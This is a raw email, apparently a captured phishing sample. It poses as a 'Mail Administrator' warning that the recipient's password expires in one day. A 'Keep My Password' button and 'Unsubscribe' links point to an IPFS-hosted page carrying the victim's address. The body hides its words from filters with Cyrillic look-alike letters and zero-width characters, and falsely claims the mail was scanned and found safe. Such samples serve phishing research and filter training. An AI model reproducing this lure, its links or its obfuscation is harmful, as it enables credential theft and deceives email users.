@@ -1,0 +1,191 @@
+Return-Path: rvroman@internet.co.nz
+Delivered-To: jose@monkey.org
+X-FDA: 80843349468.02.AF6CE66
+Received: from mail1.iconz.co.nz (mail1.iconz.net [210.48.22.104])
+	by imf11.b.hostedemail.com (Postfix) with ESMTP id CDAE28000C
+	for <jose@monkey.org>; Mon, 29 May 2023 13:19:32 +0000 (UTC)
+Authentication-Results: imf11.b.hostedemail.com;
+	dkim=pass header.d=internet.co.nz header.s=iconzdkim header.b=j5OHttvv;
+	spf=pass (imf11.b.hostedemail.com: domain of rvroman@internet.co.nz designates 210.48.22.104 as permitted sender) smtp.mailfrom=rvroman@internet.co.nz;
+	dmarc=pass (policy=quarantine) header.from=internet.co.nz;
+	arc=pass ("internet.co.nz:s=iconzdkim:i=1")
+ARC-Message-Signature: i=2; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1685366373;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=iL0sHPyCK9YubzqvgTmTkCXh/5YgERVBHTcsJd6Lehk=;
+	b=qFyJVak8B56OhQYtLChHOpU+azVw0gQpJzlu3o/jNvEW9jpJbk/gAjuVXNOf7cSBn+Ur5K
+	Qt0Sh9ZkPVdr4g5Jjm9I85+rDgSM+pSoM1NNQJc7BkFg7wGLX9j0Uwi7fHieDcWIjyx06M
+	uXsjF0QkrXxptIVvo02UofVVFAFvwVc=
+ARC-Seal: i=2; s=arc-20220608; d=hostedemail.com; t=1685366373; a=rsa-sha256;
+	cv=pass;
+	b=Zy3LJ4/g+p59ojAI4/y07/Kg0Dw/b3CoIlU7MxGuqvojktH+zGkOC23txLtBdN96ApN9Pf
+	99aclk40GXGYg14Pke0fcn9T0cnGqpKadGFChDtHI5Ydpz9sDQ/gk0lxHrjRYIqpiYd1cQ
+	omtpk/qAqfXn17INkiBZSIR2BUeFuhw=
+ARC-Authentication-Results: i=2;
+	imf11.b.hostedemail.com;
+	dkim=pass header.d=internet.co.nz header.s=iconzdkim header.b=j5OHttvv;
+	spf=pass (imf11.b.hostedemail.com: domain of rvroman@internet.co.nz designates 210.48.22.104 as permitted sender) smtp.mailfrom=rvroman@internet.co.nz;
+	dmarc=pass (policy=quarantine) header.from=internet.co.nz;
+	arc=pass ("internet.co.nz:s=iconzdkim:i=1")
+Received: from internet.co.nz (unknown [197.211.58.196])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(Client did not present a certificate)
+	(Authenticated sender: rvroman@internet.co.nz)
+	by mail1.iconz.co.nz (Postfix) with ESMTPSA id D9623AAF7D
+	for <jose@monkey.org>; Tue, 30 May 2023 01:19:27 +1200 (NZST)
+From: "Mail Administrator" <rvroman@internet.co.nz>
+To: jose@monkey.org
+Subject: [Ticket ID:SGYE-271-LPEhz4YtyUWe] IMPORTANT: You have 1 or more new messages for Your  jose@monkey.org
+Date: 29 May 2023 06:19:24 -0700
+Message-ID: <20230529061924.C0B62CC4C1BD80BD@internet.co.nz>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=internet.co.nz;
+	s=iconzdkim; t=1685366370;
+	h=from:subject:date:message-id:to:mime-version:content-type:content-transfer-encoding;
+	bh=iL0sHPyCK9YubzqvgTmTkCXh/5YgERVBHTcsJd6Lehk=;
+	b=Tm68neZta6SOJFIPp1JJqsb4M5SE7Yy9oREFKtbcCLl8YOgV+vXGxrvyO9vAnHSB1WQ+Bp
+	Y3W3nSQ+0UB16lfHmSZVNtrlOQQXPr7e4IUq1VClBGO/ppWnbzDsUNg6iV7WYSOBPDy51X
+	HuTGAv0TO+dm2nlXcZclNGwHt5/g452Vf2W0dfko/Dv2gfXy305yevTxc9k9V8IgYFcSXo
+	lzQXPvcxzpQpDNCTe88RIU6tDNCWYoXHpW4ozbikCPrxUa4xc2sRsWhvZalg2k2u2AZUFx
+	JT5b27rjKRu0IUIi9APAT/3ieNN827CYdEv6o1nY6d87Xb3AMbRZPcuN8BkkEw==
+ARC-Seal: i=1; s=iconzdkim; d=internet.co.nz; t=1685366370; a=rsa-sha256;
+	cv=none;
+	b=hcZO3KP1SFlOd0jFx1CXoEJLD+NDXRY94/+s7bPop6E/kwkifknDOuM27S3c8i6mVSUGCHJUi20PG7Q6G4VjmFdlTNR9/4yikdoIPnNWVJz0hCpEatPEi03VcUx0OOyTAQ7A2Vp8FFWySZ3uQw8GN20XUW8pz9m7jQiolnwAbvQrQb6XHJqCE/3WonQ+pE/G84O73jc/7WDMVJteoVwAfNR0VHH7AIZezDr15cScqunzhi5tQokIUkM6K2dtTxXxOVfwN3l5MopmB4J4UUVsFK2jZrKd5uSFL7OhmnA2eFA05F01evtJ3hCyXmWIco7LKDe3i6eNetN9g5e5Kg5MjA==
+ARC-Authentication-Results: i=1; auth=pass smtp.auth=rvroman@internet.co.nz
+	smtp.mailfrom=rvroman@internet.co.nz
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=internet.co.nz;
+	s=iconzdkim; t=1685366370;
+	h=from:subject:date:message-id:to:mime-version:content-type:content-transfer-encoding;
+	bh=iL0sHPyCK9YubzqvgTmTkCXh/5YgERVBHTcsJd6Lehk=;
+	b=j5OHttvvY1vNdJ0PxYc5N2lCuTVjZTC1rLyDeHytCJ2aNrzAn9p1B35m9gcuZDB/teh9dk
+	5hYoZ1JGH2Ru0+bDbkdjOZjCfEwCUW7u8QnjW50Y2dRp32P8Yi/GX/UQcaOUK6mIvmNNBj
+	QfXG8X5P15WIN00yP8Sim6Xc/7EthR4o+YoNk9tZ0PWmXJxAZ2I/lgQHoSOlnl63/AMoSs
+	90wZHDUmdo9lXCGgwHDfn9rkBgle0dg/GwFkGZzfHMPI8UIfWKCzhQw0DIeWQtFUjCQE9g
+	O2lLZ2Lvi4aR2RV750bcTFJkx+s/ECFLaWUakv1FObizdBl7YGmHW1y7UQG60Q==
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: CDAE28000C
+X-Stat-Signature: 8pmtcmdsz73ked7rpw7b1ipu7h9iog3x
+X-Spam-Status: No, score=4.80
+X-Rspam-User: 
+X-HE-Tag: 1685366372-856374
+X-HE-Meta: U2FsdGVkX19tgFjfRzlsTiHUhPrPD2iOu1/BPjhTuE+aBAUTKvAwlDlo1YF3qjOWLuHbFJ/IA30aDadah/dn67A7Xm9Bs2Hp7lytV+el28jrdTRJqm4/TPuZN2h+E9E22Ea+ZeCCS95g1KuhIxUcwOLMKzCrZT5OsknsPyFygtGXlCveODvXc3ujkVJ9Ipul3azDoWWC8MQE/XwKKl4c2KmuKKYcyz78HGaVCiqM9s1XY0xNkmTSlBwTOSYWloTcFdWMmCCl7xVj+8tAjT/D6Y56UjJDgVLIqg17fXKZBP+sykhGWKtCO2vDQOQ5/ehtS6x7iaBcuo+QXpEyadG9WMUJbq/HRtcwtbSvzUjEBtuTJQfwhktQCESOVOSIVc34hmoRfMQj/LNGvhk3HQ9ZVi+8wkgjuJAGtHJ2X1BNJBQyR0utR8+vnXTwXKNWIOjyyPk1nh0QEqMPabDeAnBa5w==
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 137
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<DIV id=3D:ok class=3D"Ar Au Ao" style=3D"DISPLAY: block">
+<DIV spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 aria-label=3D"Message B=
+ody" aria-multiline=3Dtrue aria-controls=3D:26n id=3D:og class=3D"Am Al edi=
+table LW-avf tS-tW tS-tY" hideFocus contentEditable=3Dtrue style=3D"DIRECTI=
+ON: ltr; MIN-HEIGHT: 240px" aria-owns=3D:26n g_editable=3D"true">
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: "Helvetic=
+a Neue",Helvetica,Arial,sans-serif; MARGIN-TOP: 0px; COLOR: rgb(29,34,40)'>=
+<FONT style=3D"BOX-SIZING: border-box" face=3D"Segoe UI Light">Hi jose,&#65=
+279;&#65279;<BR style=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: b=
+order-box">
+Your jose@monkey.org p&#1072;&#65279;&#65279;&#65279;&#65279;ssword is s&#1=
+077;&#65279;&#65279;&#65279;&#65279;t to &#1077;&#65279;&#65279;&#65279;&#6=
+5279;xpir&#1077;&#65279;&#65279;&#65279;&#65279; in<SPAN style=3D"BOX-SIZIN=
+G: border-box">&nbsp;</SPAN><FONT style=3D"BOX-SIZING: border-box" color=3D=
+#ff0000>1&nbsp;</FONT>d&#1072;&#65279;&#65279;&#65279;&#65279;y(s).<BR styl=
+e=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box">
+&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#65279=
+;&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#6527=
+9;&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#652=
+79;<WBR>&nbsp;&#65279;&#65279;&#65279;&#65279;&#10687;&#65279;&#65279;&#652=
+79;&#65279; jose@monkey.org<BR style=3D"BOX-SIZING: border-box"><BR style=
+=3D"BOX-SIZING: border-box">
+W&#65279;&#65279;e enc&#1086;&#65279;&#65279;&#65279;&#65279;urage y&#1086;=
+&#65279;&#65279;&#65279;&#65279;u to ta&#65279;&#65279;ke the t&#1110;&#652=
+79;&#65279;&#65279;&#65279;me n&#1086;&#65279;&#65279;&#65279;&#65279;w to =
+ma&#1110;&#65279;&#65279;&#65279;&#65279;nta&#1110;&#65279;&#65279;&#65279;=
+&#65279;n y&#1086;&#65279;&#65279;&#65279;&#65279;ur p&#1072;&#65279;&#6527=
+9;&#65279;&#65279;ssw&#1086;&#65279;&#65279;&#65279;&#65279;rd=20
+act&#1110;&#65279;&#65279;&#65279;&#65279;v&#1110;&#65279;&#65279;&#65279;&=
+#65279;ty to avo&#1110;&#65279;&#65279;&#65279;&#65279;d log&#1110;&#65279;=
+&#65279;&#65279;&#65279;n &#1110;&#65279;&#65279;&#65279;&#65279;nterrupti&=
+#1086;&#65279;&#65279;&#65279;&#65279;n.<BR style=3D"BOX-SIZING: border-box=
+"><BR style=3D"BOX-SIZING: border-box">
+<A style=3D'BOX-SIZING: border-box; FONT-SIZE: 15px; FONT-FAMILY: "segoe ui=
+ light"; BACKGROUND: rgb(38,112,236); COLOR: rgb(255,255,255); PADDING-BOTT=
+OM: 7px; PADDING-TOP: 7px; PADDING-LEFT: 7px; PADDING-RIGHT: 7px; text-deco=
+ration-line: none' href=3D"https://cloudflare-ipfs.com/ipfs/QmTcoExKyNP1Zbk=
+KmtMSkB147M1SeGSDoxtZxDhGTHhGM4#jose@monkey.org" rel=3Dnoreferrer target=3D=
+_blank=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/Qmeu8UGSQb2QRKhVxXKAk8WknRHTBmjV3xNrUoceFAMJFB%23%250%25&amp;s=
+ource=3Dgmail&amp;ust=3D1685187939934000&amp;usg=3DAOvVaw3iA_utXLdTzavQdhx9=
+bZh8">K&#1077;&#65279;&#65279;&#1077;&#65279;&#65279;p M&#65279;y &#1056;&#=
+65279;&#65279;&#1072;&#65279;&#65279;ss&#65279;w&#65279;&#65279;or&#65279;d=
+</A>
+<A style=3D"BOX-SIZING: border-box; COLOR: rgb(0,138,204); BACKGROUND-COLOR=
+: transparent" href=3D"https://webmail.georgian-airways.com/cpsess336255025=
+0/3rdparty/roundcube/#NOP" rel=3Dnoreferrer target=3D_blank data-saferedire=
+cturl=3D"https://www.google.com/url?q=3Dhttps://webmail.georgian-airways.co=
+m/cpsess3362550250/3rdparty/roundcube/%23NOP&amp;source=3Dgmail&amp;ust=3D1=
+685187939934000&amp;usg=3DAOvVaw0U55djzylZA0phDWcDvHHJ"><BR style=3D"BOX-SI=
+ZING: border-box"><BR></A></FONT></P>
+<A style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: "Helvetic=
+a Neue",Helvetica,Arial,sans-serif; COLOR: rgb(29,34,40); text-decoration-l=
+ine: none' href=3D"https://webmail.georgian-airways.com/cpsess3362550250/3r=
+dparty/roundcube/#NOP" rel=3Dnoreferrer target=3D_blank data-saferedirectur=
+l=3D"https://www.google.com/url?q=3Dhttps://webmail.georgian-airways.com/cp=
+sess3362550250/3rdparty/roundcube/%23NOP&amp;source=3Dgmail&amp;ust=3D16851=
+87939934000&amp;usg=3DAOvVaw0U55djzylZA0phDWcDvHHJ"></A>
+<SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto,sans-serif; COLOR: rgb(=
+44,54,58)"></SPAN><SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; F=
+ONT-FAMILY: "Helvetica Neue",Helvetica,Arial,sans-serif; COLOR: rgb(29,34,4=
+0)'></SPAN><SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto,sans-serif; =
+COLOR: rgb(44,54,58)"></SPAN>
+<P style=3D'BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: "Helvetic=
+a Neue",Helvetica,Arial,sans-serif; MARGIN-TOP: 0px; COLOR: rgb(29,34,40); =
+LINE-HEIGHT: 20px'>
+<A style=3D"BOX-SIZING: border-box; COLOR: rgb(0,172,255); BACKGROUND-COLOR=
+: transparent; text-decoration-line: none" href=3D"https://webmail.georgian=
+-airways.com/cpsess3362550250/3rdparty/roundcube/#NOP" rel=3Dnoreferrer tar=
+get=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps:/=
+/webmail.georgian-airways.com/cpsess3362550250/3rdparty/roundcube/%23NOP&am=
+p;source=3Dgmail&amp;ust=3D1685187939934000&amp;usg=3DAOvVaw0U55djzylZA0phD=
+WcDvHHJ"></A>
+<A style=3D"BOX-SIZING: border-box; FONT-FAMILY: sans-serif; COLOR: rgb(25,=
+106,212); BACKGROUND-COLOR: transparent; text-decoration-line: none" href=
+=3D"https://cloudflare-ipfs.com/ipfs/QmTcoExKyNP1ZbkKmtMSkB147M1SeGSDoxtZxD=
+hGTHhGM4#jose@monkey.org" rel=3Dnoreferrer target=3D_blank data-saferedirec=
+turl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-ipfs.com/ipfs/Qme=
+u8UGSQb2QRKhVxXKAk8WknRHTBmjV3xNrUoceFAMJFB%23%250%25&amp;source=3Dgmail&am=
+p;ust=3D1685187939934000&amp;usg=3DAOvVaw3iA_utXLdTzavQdhx9bZh8">
+Unsubscribe<SPAN style=3D"BOX-SIZING: border-box">&nbsp;</SPAN></A>-<SPAN s=
+tyle=3D"BOX-SIZING: border-box">&nbsp;</SPAN>
+&nbsp;<A style=3D"BOX-SIZING: border-box; FONT-FAMILY: sans-serif; COLOR: r=
+gb(25,106,212); BACKGROUND-COLOR: transparent; text-decoration-line: none" =
+href=3D"https://cloudflare-ipfs.com/ipfs/QmTcoExKyNP1ZbkKmtMSkB147M1SeGSDox=
+tZxDhGTHhGM4#jose@monkey.org" rel=3Dnoreferrer target=3D_blank data-safered=
+irecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-ipfs.com/ipfs=
+/Qmeu8UGSQb2QRKhVxXKAk8WknRHTBmjV3xNrUoceFAMJFB%23%250%25&amp;source=3Dgmai=
+l&amp;ust=3D1685187939934000&amp;usg=3DAOvVaw3iA_utXLdTzavQdhx9bZh8">
+Unsubscribe Preferences</A><BR style=3D"BOX-SIZING: border-box"><BR style=
+=3D"BOX-SIZING: border-box"><SPAN style=3D"BOX-SIZING: border-box; FONT-WEI=
+GHT: bolder"><FONT style=3D"BOX-SIZING: border-box" color=3D#df2d20 size=3D=
+2 face=3DVerdana>Your Email Credentials Must be Valid to ensure you are the=
+ right Recepient.<BR style=3D'BOX-SIZING: border-box; FONT-SIZE: 11px; FONT=
+-FAMILY: "Lucida Grande",Verdana,Arial,Helvetica,sans-serif; FONT-WEIGHT: 4=
+00; COLOR: rgb(51,51,51)'></FONT></SPAN>
+<FONT style=3D'BOX-SIZING: border-box; FONT-SIZE: 11px; FONT-FAMILY: "Lucid=
+a Grande",Verdana,Arial,Helvetica,sans-serif' color=3D#868778><SPAN style=
+=3D"BOX-SIZING: border-box; FONT-WEIGHT: bolder"><FONT style=3D"BOX-SIZING:=
+ border-box" color=3D#df2d20 size=3D2></FONT></SPAN>This mails has been sca=
+nned and considered safe.</FONT></P></DIV></DIV></BODY></HTML>
+
